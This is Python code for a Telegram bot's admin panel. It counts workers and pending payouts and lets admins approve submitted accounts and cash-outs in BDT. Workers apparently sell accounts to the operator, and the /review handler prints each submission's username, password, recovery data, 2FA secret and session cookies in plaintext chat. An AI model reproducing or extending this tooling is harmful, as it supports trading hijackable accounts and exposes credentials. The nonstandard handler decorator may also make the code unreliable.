@bot.message_with_type_handler(commands=['stats'], content_types=['text'])
def display_business_insights(message):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT role FROM admins WHERE admin_id=?", (message.from_user.id,))
    if not cursor.fetchone():
        conn.close()
        return
    cursor.execute("SELECT COUNT(*) FROM users")
    tot_w = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM submissions WHERE status='Pending'")
    p_tasks = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*), SUM(amount) FROM withdraws WHERE status='Pending'")
    w_row = cursor.fetchone()
    p_w_cnt = w_row[0]
    p_w_amt = w_row[1] if w_row[1] else 0.0
    conn.close()
    
    out = f"📊 **Enterprise Dashboard Financial Summary Insights:**\n\n" \
          f"👥 Total Active Workers Base: `{tot_w}` users\n" \
          f"📥 Pending Account Review Audit Tasks Queue: `{p_tasks}` instances\n" \
          f"💳 Pending Payout Settlements: `{p_w_cnt}` cases (Totaling: ৳`{p_w_amt:.2f}` BDT)"
    bot.reply_to(message, out, parse_mode="Markdown")

@bot.message_with_type_handler(commands=['review'], content_types=['text'])
def review_pending_submissions(message):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT role FROM admins WHERE admin_id=?", (message.from_user.id,))
    if not cursor.fetchone():
        conn.close()
        return
        
    cursor.execute("SELECT sub_id, user_id, task_main, username, password, recovery, tfa_key, cookies FROM submissions WHERE status='Pending' LIMIT 1")
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        bot.reply_to(message, "🎉 Task audit logs cleared! No entries pending administrative verification.")
        return
        
    sub_id, u_id, plat, user, pwd, rec, tfa, cook = row
    info = f"📥 **Audit Task Entry Record #{sub_id}**\n\n" \
           f"👤 Worker Target Node ID: `{u_id}`\n" \
           f"🎯 Platform Platform Context: `{plat}`\n" \
           f"📧 Username/Email: `{user}`\n" \
           f"🔐 Account Password: `{pwd}`\n" \
           f"🎒 Recovery Node String: `{rec}`\n" \
           f"🔑 2FA Security Token: `{tfa}`\n" \
           f"🍪 Cookies Context: `{cook}`"
           
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("🟢 Approve", callback_data=f"rev_app_{sub_id}"),
        types.InlineKeyboardButton("🔴 Reject", callback_data=f"rev_rej_{sub_id}")
    )
    bot.send_message(message.chat.id, info, parse_mode="Markdown", reply_markup=markup)

@bot.message_with_type_handler(commands=['payreview'], content_types=['text'])
def review_pending_withdrawals(message):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT role FROM admins WHERE admin_id=?", (message.from_user.id,))
    if not cursor.fetchone():
        conn.close()
        return
        
    cursor.execute("SELECT w_id, user_id, method, amount, address FROM withdraws WHERE status='Pending' LIMIT 1")
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        bot.reply_to(message, "🎉 Payout requests pipeline empty. All liquid cash settlements deployed.")
        return
        
    w_id, u_id, method, amount, addr = row
    info = f"💳 **Cashout Settlement Validation Request #{w_id}**\n\n" \
           f"👤 Worker Identity Target: `{u_id}`\n" \
           f"📲 Channel Routing Engine: `{method}`\n" \
           f"💰 Nominal Amount Requested: ৳`{amount:.2f}` BDT\n" \
           f"📍 Beneficiary End Node Address: `{addr}`"
           
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("🟢 Mark Paid", callback_data=f"pay_app_{w_id}"),
        types.InlineKeyboardButton("🔴 Decline Refund", callback_data=f"pay_rej_{w_id}")
    )
    bot.send_message(message.chat.id, info, parse_mode="Markdown", reply_markup=markup)

